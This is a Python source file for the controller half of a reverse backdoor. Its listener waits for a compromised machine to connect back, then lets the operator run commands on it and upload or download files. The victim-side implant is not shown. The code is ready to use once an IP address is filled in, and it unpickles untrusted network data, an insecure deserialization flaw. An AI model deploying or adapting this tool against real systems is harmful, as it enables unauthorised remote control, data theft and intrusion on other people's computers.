import socket
import pickle
import sys

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = pickle.dumps(data)
        self.connection.sendall(json_data)

    def reliable_receive(self):
        json_data = b""
        while True:
            temp = self.connection.recv(1024)
            json_data = json_data + temp
            try:
                return pickle.loads(json_data)
            except pickle.UnpicklingError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            sys.exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution"
            print(result)


my_listener = Listener("ENTER YOUR IP ADDRESS", 8080)
my_listener.run()
